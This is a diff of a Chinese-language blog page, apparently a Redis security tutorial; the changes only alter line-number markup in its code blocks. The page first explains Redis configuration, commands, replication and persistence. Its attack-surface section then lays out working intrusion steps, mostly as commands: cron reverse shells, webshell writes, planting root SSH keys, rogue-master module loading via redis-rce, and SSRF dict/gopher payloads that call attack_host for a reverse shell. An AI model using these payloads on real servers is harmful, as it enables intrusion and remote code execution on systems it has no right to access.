@@ -259,10 +259,10 @@
 <h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2. 配置"></a>2. 配置</h3><p><strong>配置修改</strong></p>
 <p>可以通过修改 redis.conf 文件或使用 CONFIG SET 命令来修改配置。</p>
 <p>语法<br>CONFIG SET 命令基本语法：</p>
-<pre class="language-none"><code class="language-none">redis 127.0.0.1:6379&gt; CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">redis 127.0.0.1:6379&gt; CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>redis.conf 配置项说明：</strong></p>
-<pre class="language-none"><code class="language-none">1) daemonize no	                 # Redis 默认不是以守护进程的方式运行，可以通过该配置项修改，使用 yes 启用守护进程
+<pre class="line-numbers language-none"><code class="language-none">1) daemonize no	                 # Redis 默认不是以守护进程的方式运行，可以通过该配置项修改，使用 yes 启用守护进程
 
 2) pidfile &#x2F;var&#x2F;run&#x2F;redis.pid	 # 当 Redis 以守护进程方式运行时，Redis 默认会把 pid 写入 &#x2F;var&#x2F;run&#x2F;redis.pid 文件，可以通过 pidfile 指定
 
@@ -332,10 +332,10 @@
 
 29) activerehashing yes	                  # 指定是否激活重置哈希，默认为开启）
 
-30) include &#x2F;path&#x2F;to&#x2F;local.conf	          # 指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件</code></pre>
+30) include &#x2F;path&#x2F;to&#x2F;local.conf	          # 指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3. 数据类型"></a>3. 数据类型</h3><p>Redis支持五种数据类型：string（字符串），hash（哈希），list（列表），set（集合）及zset(sorted set：有序集合)</p>
-<pre class="language-none"><code class="language-none">1) String（字符串）
+<pre class="line-numbers language-none"><code class="language-none">1) String（字符串）
 
 string 是 redis 最基本的类型，一个 key 对应一个 value，redis 的 string 可以包含任何数据，比如jpg图片或者序列化的对象，string 类型的值最大能存储 512MB
 
@@ -369,9 +369,9 @@ Redis 的 Set 是 string 类型的无序集合。集合是通过哈希表实现�
 Redis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序
 
 命令：zadd key score member        # 添加元素到集合，元素在集合中存在则更新对应score
-     ZRANGEBYSCORE key 0 1000     # 查看zset</code></pre>
+     ZRANGEBYSCORE key 0 1000     # 查看zset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="4-常用命令"><a href="#4-常用命令" class="headerlink" title="4. 常用命令"></a>4. 常用命令</h3><pre class="language-none"><code class="language-none">1) 连接命令
+<h3 id="4-常用命令"><a href="#4-常用命令" class="headerlink" title="4. 常用命令"></a>4. 常用命令</h3><pre class="line-numbers language-none"><code class="language-none">1) 连接命令
 redis-cli -h ip -p port -a passwd   # 远程连接
 PING                                # 查看服务是否运行，运行则返回PONG
 QUIT                                # 关闭当前连接
@@ -439,9 +439,9 @@ SLAVEOF host port                    # 将当前服务器转变为指定服务�
     13	-t	仅运行以逗号分隔的测试命令列表。	
     14	-I  Idle 模式，仅打开 N 个 idle 连接并等待。
 
-eg: redis-benchmark -h 127.0.0.1 -p 6379 -t set,lpush -n 10000 -q</code></pre>
+eg: redis-benchmark -h 127.0.0.1 -p 6379 -t set,lpush -n 10000 -q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="5-启动方式"><a href="#5-启动方式" class="headerlink" title="5. 启动方式"></a>5. 启动方式</h3><pre class="language-none"><code class="language-none">1) 指定配置文件直接启动：进入redis根目录，执行如下命令，可设置为各类用户启动
+<h3 id="5-启动方式"><a href="#5-启动方式" class="headerlink" title="5. 启动方式"></a>5. 启动方式</h3><pre class="line-numbers language-none"><code class="language-none">1) 指定配置文件直接启动：进入redis根目录，执行如下命令，可设置为各类用户启动
 
 .&#x2F;redis-server &#x2F;etc&#x2F;redis&#x2F;redis.conf &amp;
 
@@ -459,29 +459,29 @@ chkconfig redisd on
 service redisd start
 
 #关闭服务
-service redisd stop</code></pre>
+service redisd stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="6-主从复制"><a href="#6-主从复制" class="headerlink" title="6. 主从复制"></a>6. 主从复制</h3><h4 id="a-基本原理"><a href="#a-基本原理" class="headerlink" title="a. 基本原理"></a>a. 基本原理</h4><p>数据库复制指的是发生在不同数据库实例之间，单向的信息传播的行为，通常由被复制方和复制方组成，被复制方和复制方之间建立网络连接，复制方式通常为被复制方主动将数据发送到复制方，复制方接收到数据存储在当前实例，最终目的是为了保证双方的数据一致、同步</p>
 <p>通过配置多个Redis实例独立运行、定向复制，形成Redis集群，master负责写、slave负责读。</p>
 <h4 id="b-复制过程"><a href="#b-复制过程" class="headerlink" title="b. 复制过程"></a>b. 复制过程</h4><p><img src="http://static.oschina.net/uploads/space/2016/0529/142921_LCDS_1759553.png"></p>
-<pre class="language-none"><code class="language-none">1) slave向master发送sync命令。
+<pre class="line-numbers language-none"><code class="language-none">1) slave向master发送sync命令。
 2) master开启子进程来讲dataset写入rdb文件，同时将子进程完成之前接收到的写命令缓存起来。
 3) 子进程写完，父进程得知，开始将RDB文件发送给slave。
 4) master发送完RDB文件，将缓存的命令也发给slave。
-5) master增量的把写命令发给slave</code></pre>
+5) master增量的把写命令发给slave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="c-配置方式"><a href="#c-配置方式" class="headerlink" title="c. 配置方式"></a>c. 配置方式</h4><p><strong>slave启动时指定master机器</strong></p>
 <p>假设有四台redis实例，M1，R1、R2、R3，其中M1为master，R1、R2、R3分别为三台slave redis实例。在M1启动如下：</p>
-<pre class="language-none"><code class="language-none">.&#x2F;redis-server ..&#x2F;redis8000.conf --port 8000</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;redis-server ..&#x2F;redis8000.conf --port 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>下面分别为R1、R2、R3的启动命令：</p>
-<pre class="language-none"><code class="language-none">.&#x2F;redis-server ..&#x2F;redis8001.conf --port 8001 --slaveof 127.0.0.1 8000
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;redis-server ..&#x2F;redis8001.conf --port 8001 --slaveof 127.0.0.1 8000
 .&#x2F;redis-server ..&#x2F;redis8002.conf --port 8002 --slaveof 127.0.0.1 8000
-.&#x2F;redis-server ..&#x2F;redis8003.conf --port 8003 --slaveof 127.0.0.1 8000</code></pre>
+.&#x2F;redis-server ..&#x2F;redis8003.conf --port 8003 --slaveof 127.0.0.1 8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>成功的启动了四台Redis实例，master实例的服务端口为8000，R1、R2、R3的服务端口分别为8001、8002、8003</p>
 <p><strong>slave运行时指定master机器</strong></p>
-<pre class="language-none"><code class="language-none">1) 启动一台master
+<pre class="line-numbers language-none"><code class="language-none">1) 启动一台master
 
 .&#x2F;redis-server --port 8000
 
@@ -490,13 +490,13 @@ service redisd stop</code></pre>
 .&#x2F;redis-server --port 8001 
 
 .&#x2F;redis-cli -p 8001
-127.0.0.1:8001&gt; slaveof 127.0.0.1 8000</code></pre>
+127.0.0.1:8001&gt; slaveof 127.0.0.1 8000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="7-持久化机制"><a href="#7-持久化机制" class="headerlink" title="7. 持久化机制"></a>7. 持久化机制</h3><h4 id="a-背景原理"><a href="#a-背景原理" class="headerlink" title="a. 背景原理"></a>a. 背景原理</h4><p>Redis是内存数据库，数据都是存储在内存中，为了避免进程退出导致数据的永久丢失，需要定期将Redis中的数据以某种形式(数据或命令)从内存保存到硬盘；当下次Redis重启时，利用持久化文件实现数据恢复</p>
 <p>Redis持久化分为RDB持久化和AOF持久化：前者将当前数据保存到硬盘，后者则是将每次执行的写命令保存到硬盘（类似于MySQL的binlog）；由于AOF持久化的实时性更好，即当进程意外退出时丢失的数据更少，因此AOF是目前主流的持久化方式</p>
 <h4 id="b-RDB持久化"><a href="#b-RDB持久化" class="headerlink" title="b. RDB持久化"></a>b. RDB持久化</h4><p>RDB持久化是将当前进程中的数据生成快照保存到硬盘(因此也称作快照持久化)，保存的文件后缀是rdb；当Redis重新启动时，可以读取快照文件恢复数据</p>
 <p><strong>RDB文件</strong></p>
-<pre class="language-none"><code class="language-none">1） 配置方式
+<pre class="line-numbers language-none"><code class="language-none">1） 配置方式
 
 RDB文件是经过压缩的二进制文件，RDB文件的存储路径既可以在启动前配置，也可以通过命令动态设定。
 
@@ -520,17 +520,17 @@ dir .&#x2F;：RDB文件和AOF文件所在目录
 
 3) 加载原理
 
-RDB文件的载入工作是在服务器启动时自动执行的，并没有专门的命令。但是由于AOF的优先级更高，因此当AOF开启时，Redis会优先载入AOF文件来恢复数据；只有当AOF关闭时，才会在Redis服务器启动时检测RDB文件，并自动载入。服务器载入RDB文件期间处于阻塞状态，直到载入完成为止</code></pre>
+RDB文件的载入工作是在服务器启动时自动执行的，并没有专门的命令。但是由于AOF的优先级更高，因此当AOF开启时，Redis会优先载入AOF文件来恢复数据；只有当AOF关闭时，才会在Redis服务器启动时检测RDB文件，并自动载入。服务器载入RDB文件期间处于阻塞状态，直到载入完成为止<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>手动触发</strong></p>
 <p>可用save命令和bgsave命令来生成RDB文件</p>
-<pre class="language-none"><code class="language-none">127.0.0.1:6379&gt; save
-127.0.0.1:6379&gt; bgsave</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">127.0.0.1:6379&gt; save
+127.0.0.1:6379&gt; bgsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>save命令会阻塞Redis服务器进程，直到RDB文件创建完毕为止，在Redis服务器阻塞期间，服务器不能处理任何命令请求，而bgsave命令会创建一个子进程，由子进程来负责创建RDB文件，父进程(即Redis主进程)则继续处理请求</p>
 <p>bgsave命令执行过程中，只有fork子进程时会阻塞服务器，而对于save命令，整个过程都会阻塞服务器，线上环境要杜绝save的使用，在自动触发RDB持久化时，Redis也会选择bgsave而不是save来进行持久化</p>
 <p><strong>自动触发</strong></p>
-<pre class="language-none"><code class="language-none">save m n  # 自动触发最常见的情况是在配置文件(redis.conf)中通过save m n，指定当m秒内发生n次变化时，会触发bgsave</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">save m n  # 自动触发最常见的情况是在配置文件(redis.conf)中通过save m n，指定当m秒内发生n次变化时，会触发bgsave<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>Redis的save m n，是通过serverCron函数、dirty计数器、和lastsave时间戳来实现的</p>
 <p>serverCron是Redis服务器的周期性操作函数，默认每隔100ms执行一次；该函数对服务器的状态进行维护，其中一项工作就是检查 save m n 配置的条件是否满足，如果满足就执行bgsave。</p>
@@ -538,17 +538,17 @@ RDB文件的载入工作是在服务器启动时自动执行的，并没有专�
 <h4 id="c-AOF持久化"><a href="#c-AOF持久化" class="headerlink" title="c. AOF持久化"></a>c. AOF持久化</h4><p>RDB持久化是将进程数据写入文件，而AOF持久化(即Append Only File持久化)，则是将Redis执行的每次写命令记录到单独的日志文件中（有点像MySQL的binlog）；当Redis重启时再次执行AOF文件中的命令来恢复数据</p>
 <p><strong>开启AOF</strong></p>
 <p>Redis服务器默认开启RDB，关闭AOF；要开启AOF，需要在配置文件中配置：</p>
-<pre class="language-none"><code class="language-none">appendonly yes</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">appendonly yes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>执行流程</strong></p>
-<pre class="language-none"><code class="language-none">由于需要记录Redis的每条写命令，因此AOF不需要触发，AOF的执行流程包括：
+<pre class="line-numbers language-none"><code class="language-none">由于需要记录Redis的每条写命令，因此AOF不需要触发，AOF的执行流程包括：
 
 1） 命令追加(append)：将Redis的写命令追加到缓冲区aof_buf；
 2） 文件写入(write)和文件同步(sync)：根据不同的同步策略将aof_buf中的内容同步到硬盘；
-3） 文件重写(rewrite)：定期重写AOF文件，达到压缩的目的</code></pre>
+3） 文件重写(rewrite)：定期重写AOF文件，达到压缩的目的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>常用配置</strong></p>
-<pre class="language-none"><code class="language-none">appendonly no：是否开启AOF
+<pre class="line-numbers language-none"><code class="language-none">appendonly no：是否开启AOF
 
 appendfilename &quot;appendonly.aof&quot;：AOF文件名
 
@@ -562,14 +562,14 @@ auto-aof-rewrite-percentage 100：文件重写触发条件之一
 
 auto-aof-rewrite-min-size 64mb：文件重写触发提交之一
 
-aof-load-truncated yes：如果AOF文件结尾损坏，Redis启动时是否仍载入AOF文件</code></pre>
+aof-load-truncated yes：如果AOF文件结尾损坏，Redis启动时是否仍载入AOF文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0x02-攻击面"><a href="#0x02-攻击面" class="headerlink" title="0x02 攻击面"></a>0x02 攻击面</h2><h3 id="1-写文件Getshell"><a href="#1-写文件Getshell" class="headerlink" title="1. 写文件Getshell"></a>1. 写文件Getshell</h3><p>当Redis暴露在公网，且以root方式启动，未配置访问认证时，可通过各类写文件方式getshell，如定时任务写入反弹shell、网站根目录写入webshell、写入SSH公钥，也可利用一切可利用文件，配置各类后门；此类方式适用于物理机&#x2F;虚拟机等存在多种可利用文件的环境</p>
 <h4 id="a-定时任务"><a href="#a-定时任务" class="headerlink" title="a. 定时任务"></a>a. 定时任务</h4><p>条件</p>
-<pre class="language-none"><code class="language-none">1) root启用Redis
-2) redis无密码或者弱密码</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">1) root启用Redis
+2) redis无密码或者弱密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<pre class="language-none"><code class="language-none">config get dir          # 查看当前数据存储目录
+<pre class="line-numbers language-none"><code class="language-none">config get dir          # 查看当前数据存储目录
 config get dbfilename   # 查看当前数据存放文件
 
 config set dir &#x2F;var&#x2F;spool&#x2F;cron  # 设置文件写入目录
@@ -582,15 +582,15 @@ save                            # 保存，完成文件写入
 del shell
 
 config set dir &#x2F;var&#x2F;lib&#x2F;redis   # 设置回原来的目录         
-config set dbfilename dump.rdb  # 设置回原来的文件名</code></pre>
+config set dbfilename dump.rdb  # 设置回原来的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="b-webshell"><a href="#b-webshell" class="headerlink" title="b. webshell"></a>b. webshell</h4><p>通过config命令向固定路径的文件写入内容，利用此功能来向指定文件写入恶意内容</p>
 <p>条件</p>
-<pre class="language-none"><code class="language-none">1) 知道网站绝对路径，并且需要增删改查权限
+<pre class="line-numbers language-none"><code class="language-none">1) 知道网站绝对路径，并且需要增删改查权限
 2) root启动redis
-3) redis弱密码或者无密码</code></pre>
+3) redis弱密码或者无密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<pre class="language-none"><code class="language-none">config get dir          # 查看当前数据存储目录
+<pre class="line-numbers language-none"><code class="language-none">config get dir          # 查看当前数据存储目录
 config get dbfilename   # 查看当前数据存放文件
 
 config set dir &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html  # 设置文件写入目录，网站根目录
@@ -601,13 +601,13 @@ save
 del info
 
 config set dir &#x2F;var&#x2F;lib&#x2F;redis   # 设置回原来的目录         
-config set dbfilename dump.rdb  # 设置回原来的文件名</code></pre>
+config set dbfilename dump.rdb  # 设置回原来的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="c-写公钥"><a href="#c-写公钥" class="headerlink" title="c. 写公钥"></a>c. 写公钥</h4><p>条件</p>
-<pre class="language-none"><code class="language-none">1) Redis服务使用ROOT账号启动
-2) 服务器开放了SSH服务，而且允许使用密钥登录</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">1) Redis服务使用ROOT账号启动
+2) 服务器开放了SSH服务，而且允许使用密钥登录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<pre class="language-none"><code class="language-none">1) 本机生成公钥
+<pre class="line-numbers language-none"><code class="language-none">1) 本机生成公钥
 ssh-keygen -t rsa -C &quot;test@mail.com&quot; -f ~&#x2F;.ssh&#x2F;test
 
 (echo -e &quot;\n\n&quot;;cat test.pub;echo -e &quot;\n\n&quot;) | redis-cli -h 192.168.1.100 -x set ssh_key
@@ -627,12 +627,12 @@ config set dbfilename dump.rdb  # 设置回原来的文件名
 
 3) ssh免密登录
 
-ssh -i &#x2F;root&#x2F;.ssh&#x2F;test root@192.168.1.100</code></pre>
+ssh -i &#x2F;root&#x2F;.ssh&#x2F;test root@192.168.1.100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="2-主从复制RCE"><a href="#2-主从复制RCE" class="headerlink" title="2. 主从复制RCE"></a>2. 主从复制RCE</h3><p>在容器场景下，单一的容器中不会有除redis以外的任何服务存在，当类似虚拟机上的crontab、ssh等失效时，只靠写文件很难再getshel，这种情况下，可利用redis主从复制的特性getshell</p>
 <p>Redis主从复制的机制，可以通过FULLRESYNC将任意文件同步到从节点（slave），在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，在从节点上加载加载恶意的.so文件，达到代码执行的目的</p>
 <p><strong>手工利用</strong></p>
-<pre class="language-none"><code class="language-none">1) 构造恶意Redis服务器，监听本地端口2233，加载exp.so
+<pre class="line-numbers language-none"><code class="language-none">1) 构造恶意Redis服务器，监听本地端口2233，加载exp.so
 
     python RogueServer.py --lport 2233 --exp exp.so
 
@@ -655,10 +655,10 @@ ssh -i &#x2F;root&#x2F;.ssh&#x2F;test root@192.168.1.100</code></pre>
 
     system.exec &#39;rm .&#x2F;exp.so&#39;       #删除exp.so
 
-    module unload system            #卸载system模块的加载</code></pre>
+    module unload system            #卸载system模块的加载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>自动化脚本</strong></p>
-<pre class="language-none"><code class="language-none">1) 生成恶意.so文件
+<pre class="line-numbers language-none"><code class="language-none">1) 生成恶意.so文件
 
 git clone https:&#x2F;&#x2F;github.com&#x2F;n0b0dyCN&#x2F;RedisModules-ExecuteCommand
 cd RedisModules-ExecuteCommand&#x2F; &amp;&amp; make
@@ -671,11 +671,11 @@ git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;redis-rce.git
 cd redis-rce&#x2F;
 cp ..&#x2F;RedisModules-ExecuteCommand&#x2F;src&#x2F;module.so .&#x2F;
 pip install -r requirements.txt 
-python redis-rce.py -r 192.168.1.100 -p 6379 -L 192.168.1.101 -f module.so</code></pre>
+python redis-rce.py -r 192.168.1.100 -p 6379 -L 192.168.1.101 -f module.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="3-SSRF组合利用"><a href="#3-SSRF组合利用" class="headerlink" title="3. SSRF组合利用"></a>3. SSRF组合利用</h3><p>当Redis仅开放在内网，可利用其他已知的公网漏洞进行组合利用</p>
 <p><strong>利用dict协议</strong></p>
-<pre class="language-none"><code class="language-none">#查看当前redis的相关配置
+<pre class="line-numbers language-none"><code class="language-none">#查看当前redis的相关配置
 ssrf.php?url&#x3D;dict:&#x2F;&#x2F;target_host:6379&#x2F;info
 
 #设置备份文件名
@@ -691,14 +691,14 @@ ssrf.php?url&#x3D;dict:&#x2F;&#x2F;target_host:6379&#x2F;module:load:.&#x2F;exp.
 ssrf.php?url&#x3D;dict:&#x2F;&#x2F;target_host:6379&#x2F;slaveof:no:one
 
 #执行系统命令
-ssrf.php?url&#x3D;dict:&#x2F;&#x2F;target_host:6379&#x2F;system.rev:attack_host:9999</code></pre>
+ssrf.php?url&#x3D;dict:&#x2F;&#x2F;target_host:6379&#x2F;system.rev:attack_host:9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>利用gopher协议</strong></p>
-<pre class="language-none"><code class="language-none">#设置文件名，连接恶意Redis服务器
+<pre class="line-numbers language-none"><code class="language-none">#设置文件名，连接恶意Redis服务器
 gopher:&#x2F;&#x2F;target_host:6379&#x2F;_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520attack_host%25201234%250d%250aquit
 
 #加载exp.so，反弹shell
-gopher:&#x2F;&#x2F;target_host:6379&#x2F;_module%2520load%2520.&#x2F;exp.so%250d%250asystem.rev%2520attack_host%25209999%250d%250aquit</code></pre>
+gopher:&#x2F;&#x2F;target_host:6379&#x2F;_module%2520load%2520.&#x2F;exp.so%250d%250asystem.rev%2520attack_host%25209999%250d%250aquit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h2><ul>
 <li><p><a target="_blank" rel="noopener" href="https://redis.io/docs/">https://redis.io/docs/</a></p>
